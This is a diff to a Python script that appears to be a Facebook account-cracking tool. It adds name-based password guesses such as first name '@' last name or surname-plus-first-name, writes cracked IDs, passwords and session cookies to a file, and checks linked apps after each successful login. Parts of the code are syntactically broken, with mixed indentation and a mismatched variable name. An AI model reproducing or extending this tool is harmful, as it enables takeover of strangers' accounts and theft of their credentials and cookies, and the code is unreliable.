@@ -525,14 +525,14 @@ def setting():
         method.append('free')
     else:
         method.append('mobile')
-    _jembot_ = input('=>SHOW APKS ( Y/N ) ')
-    	if _jembot_ in ['']:
-    print('=>CHOOSE THE CORRECT ONE')
-        back()
-    elif _jembot_ in ['y','Y','yes','YES','1']:
-		taplikasi.append('yes')
-	else:
-		taplikasi.append('no')
+    _jembot_ = input('=>SHOW APKS ( Y/t ) ')
+    if _jembot_ in ['']:
+       print('=>CHOOSE THE CORRECT ONE')
+       back()
+    elif _jembot_ in ['y','Y']:
+        taplikasi.append('ya')
+    else:
+        taplikasi.append('no')
     passwrd()
     exit() 
  
@@ -558,17 +558,20 @@ def passwrd():
                 else:
                     pwv.append(nmf)
                     pwv.append(frs+lst+'123')
+                    pwv.append(frs+'@'+lst)
+					pwv.append(frs+'#'+lst)
+                    pwv.append(frs+lst+'1234')
+                    pwv.append(lst+frs)
+                    pwv.append(frs+lst)
+                    pwv.append(frs+lst+'12')
                     pwv.append(frs+lst+'1234')
                     pwv.append(frs+lst+'12345')
                     pwv.append(frs+lst+'@12')
                     pwv.append(frs+lst+'@123')
                     pwv.append(frs+lst+'@1234')
                     pwv.append(frs+lst+'@12345')
-                    pwv.append(frs+lst+'@') 
-                    pwv.append(frs+lst+'12')
-                    pwv.append(frs+'@')
                     pwv.append(frs+'@12')
-                    pwv.append(frs+12')
+                    pwv.append(frs+'12')
                     pwv.append(frs+'123')
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
@@ -581,17 +584,20 @@ def passwrd():
                 else:
                     pwv.append(nmf)
                     pwv.append(frs+lst+'123')
+                    pwv.append(frs+'@'+lst)
+					pwv.append(frs+'#'+lst)
+                    pwv.append(frs+lst+'1234')
+                    pwv.append(lst+frs)
+                    pwv.append(frs+lst)
+                    pwv.append(frs+lst+'12')
                     pwv.append(frs+lst+'1234')
                     pwv.append(frs+lst+'12345')
                     pwv.append(frs+lst+'@12')
                     pwv.append(frs+lst+'@123')
                     pwv.append(frs+lst+'@1234')
                     pwv.append(frs+lst+'@12345')
-                    pwv.append(frs+lst+'@') 
-                    pwv.append(frs+lst+'12')
-                    pwv.append(frs+'@')
                     pwv.append(frs+'@12')
-                    pwv.append(frs+12')
+                    pwv.append(frs+'12')
                     pwv.append(frs+'123')
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
@@ -657,6 +663,7 @@ def crack(idf,pwv):
                 print(f'\033[1;93m   [🇳🇵] COOKIE (1) \033[1;92m : '+kuki)
                 #os.system#@('espeak -a 300 " MANAS,  Ok,  id"')
                 open('/sdcard/MANAS/MANAS-OK.txt/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+                cek_apk(session,coki)
                 break
                 
             else:
@@ -699,6 +706,7 @@ def crackfree(idf,pwv):
                 print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
                # os.system#('espeak -a 300 " Ok,  MANAS,  id"')
                 open('/sdcard/MANAS/MANAS-OK.txt/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+                cek_apk(session,coki)
                 break
                 
             else:
